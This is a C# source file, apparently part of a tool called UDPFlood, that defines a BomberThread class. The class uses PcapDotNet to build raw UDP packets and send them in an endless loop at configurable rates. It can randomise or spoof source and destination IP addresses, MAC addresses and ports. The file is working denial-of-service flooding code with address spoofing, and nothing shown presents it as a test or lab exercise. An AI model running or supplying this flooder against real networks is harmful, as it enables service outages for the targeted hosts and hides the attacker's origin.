using System.Text;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using UDPFlood.Ethernet.FloodSettings;

namespace UDPFlood.Ethernet;

public delegate void BomberThreadEventArgs();

public class BomberThread
{
    public Guid ThreadId { get; } = Guid.NewGuid();

    public ThreadStatus Status { get; private set; }
    public BomberThreadSettings Settings { get; }
    public ulong PacketSendedCount { get; private set; }
    public DateTimeOffset LastPacketSendedAt { get; private set; } = DateTimeOffset.MinValue;
    public bool IsFlooderWork { get; private set; }

    private readonly int _packetInSession;
    private int _sessionPacketCount = 0;
    private readonly Random _rnd = new();
    private readonly StringBuilder _sb = new();
    private readonly string _alphabet = "qwertyuiopasdghjklzxcvbnm1234567890";

    public BomberThread(BomberThreadSettings settings)
    {
        Status = ThreadStatus.Stop;
        Settings = settings;
        PacketSendedCount = 0;

        if (Settings.Delay.IsDelay)
            _packetInSession = Settings.Delay.PacketCount;
    }

    public event BomberEventArgs? OnThreadChanged;

    public void Start(LivePacketDevice device)
    {
        IsFlooderWork = true;
        _sessionPacketCount = 0;

        while (IsFlooderWork)
        {
            if (Settings.Delay.IsDelay && _sessionPacketCount >= _packetInSession)
            {
                _sessionPacketCount = 0;
                Status = ThreadStatus.Awaited;
                OnThreadChanged?.Invoke();

                for (int i = 0; i < Settings.Delay.Delay * 10 && IsFlooderWork; i++)
                    Thread.Sleep(Settings.Delay.Every * 100);
            }

            if (!IsFlooderWork)
                break;

            Status = ThreadStatus.InProgress;
            OnThreadChanged?.Invoke();

            SendPacket(device);

            PacketSendedCount++;

            OnThreadChanged?.Invoke();

            if (Settings.Delay.IsDelay)
            {
                for (int i = 0; i < Settings.Delay.Delay * 10 && IsFlooderWork; i++)
                    Thread.Sleep(Settings.Delay.Every * 100);

                _sessionPacketCount++;
            }
        }
    }

    public void Stop()
    {
        if (!IsFlooderWork)
            throw new InvalidOperationException();

        IsFlooderWork = false;
        Status = ThreadStatus.Stop;
        _sessionPacketCount = 0;

        OnThreadChanged?.Invoke();
    }

    private void SendPacket(LivePacketDevice device)
    {
        using var communicator = device.Open();

        var ethernetLayer = new EthernetLayer()
        {
            Source = GetSourceMac(device),
            Destination = GetDestMac(),
            EtherType = EthernetType.None
        };

        var ipv4Layer = new IpV4Layer()
        {
            Source = GetSourceIp(device),
            CurrentDestination = GetDestinationIp(),
            Fragmentation = IpV4Fragmentation.None,
            HeaderChecksum = null,
            Identification = 1,
            Options = IpV4Options.None,
            Protocol = null,
            TypeOfService = 0,
            Ttl = Settings.Ttl
        };

        var udpLayer = new UdpLayer()
        {
            SourcePort = GetSourcePort(),
            DestinationPort = GetDestPort(),
            Checksum = null,
            CalculateChecksumValue = true,
        };

        var payloadLayer = new PayloadLayer()
        {
            Data = new Datagram(Encoding.ASCII.GetBytes(GetContent())),
        };

        var builder = new PacketBuilder(ethernetLayer, ipv4Layer, udpLayer, payloadLayer);
        var packet = builder.Build(DateTime.Now);

        communicator.SendPacket(packet);

        LastPacketSendedAt = DateTimeOffset.Now;
    }

    private MacAddress GetMacAddressFromSettings(MacSettings settings)
    {
        if (settings.Mode != MacMode.FromList || settings.Addresses == null)
            throw new NullReferenceException();

        var list = settings.Addresses.ToList();
        var index = _rnd.Next(list.Count);

        return new MacAddress(list[index]);
    }

    private MacAddress GenerateRandomMacAddress()
    {
        _sb.Clear();

        var macGroups = 6;
        for (int i = 0; i < macGroups; i++)
        {
            for (int j = 0; j < 2; j++)
            {
                _sb.Append(_rnd.Next(16).ToString("X"));
            }

            if (i != macGroups - 1)
                _sb.Append(':');
        }

        return new MacAddress(_sb.ToString());
    }

    private string GetContent()
    {
        switch (Settings.Content.Mode) 
        {
            case ContentMode.Empty: 
                return string.Empty;

            case ContentMode.FromContent: 
                return Settings.Content.Content ?? string.Empty;

            case ContentMode.Random:
                _sb.Clear();

                for (int i = 0; i < 32; i++)
                    _sb.Append(_alphabet[_rnd.Next(_alphabet.Length)]);

                return _sb.ToString();

            default:
                throw new InvalidOperationException();
        }
    }

    private ushort GetDestPort()
        => Settings.DestinationPort.Mode switch
        {
            PortMode.Random => (ushort)_rnd.Next(65535),
            PortMode.FromList => (ushort)(Settings.DestinationPort.Ports?.ToList()[_rnd.Next(Settings.DestinationPort.Ports.Count())] ?? 0),
            _ => throw new InvalidOperationException(),
        };

    private ushort GetSourcePort()
        => Settings.SourcePort.Mode switch
        {
            PortMode.Random => (ushort)_rnd.Next(65535),
            PortMode.FromList => (ushort)(Settings.SourcePort.Ports?.ToList()[_rnd.Next(Settings.SourcePort.Ports.Count())] ?? 0),
            _ => throw new InvalidOperationException(),
        };

    private IpV4Address GenerateRandomIp()
    {
        _sb.Clear();
        for (int i = 0; i < 4; i++)
        {
            _sb.Append(_rnd.Next(256));
            _sb.Append('.');
        }
        _sb.Remove(_sb.Length - 1, 1);

        return new IpV4Address(_sb.ToString());
    }

    private IpV4Address GetRandomAddressFromSettings(IpSettings settings)
    {
        if (settings.Mode != IpMode.FromList || settings.Addresses == null)
            throw new InvalidOperationException();

        var list = settings.Addresses.ToList();
        var index = _rnd.Next(list.Count);

        return new IpV4Address(list[index]);
    }

    private IpV4Address GetSourceIp(LivePacketDevice device)
    {
        switch (Settings.SourceIp.Mode) 
        {
            case IpMode.MySelf:
                return new (device.GetNetworkInterface().GetIPProperties().GatewayAddresses[0].Address.ToString());

            case IpMode.FromList:
                return GetRandomAddressFromSettings(Settings.SourceIp);

            case IpMode.Random:
                return GenerateRandomIp();

            default:
                throw new InvalidOperationException();
        }
    }

    private IpV4Address GetDestinationIp()
    {
        switch (Settings.DestinationIp.Mode)
        {
            case IpMode.FromList:
                return GetRandomAddressFromSettings(Settings.DestinationIp);

            case IpMode.Random:
                return GenerateRandomIp();

            default:
                throw new InvalidOperationException();
        }
    }

    private MacAddress GetSourceMac(LivePacketDevice device)
    {
        switch (Settings.SourceMac.Mode)
        {
            case MacMode.MySelf:
                return device.GetMacAddress();
            case MacMode.Random:
                return GenerateRandomMacAddress();
            case MacMode.FromList:
                return GetMacAddressFromSettings(Settings.SourceMac);
            default:
                throw new InvalidOperationException();
        }
    }

    private MacAddress GetDestMac()
    {
        switch (Settings.DestinationMac.Mode)
        {
            case MacMode.Random:
                return GenerateRandomMacAddress();
            case MacMode.FromList:
                return GetMacAddressFromSettings(Settings.DestinationMac);
            default:
                throw new InvalidOperationException();
        }
    }
}

public enum ThreadStatus
{
    Stop,
    InProgress,
    Awaited
}
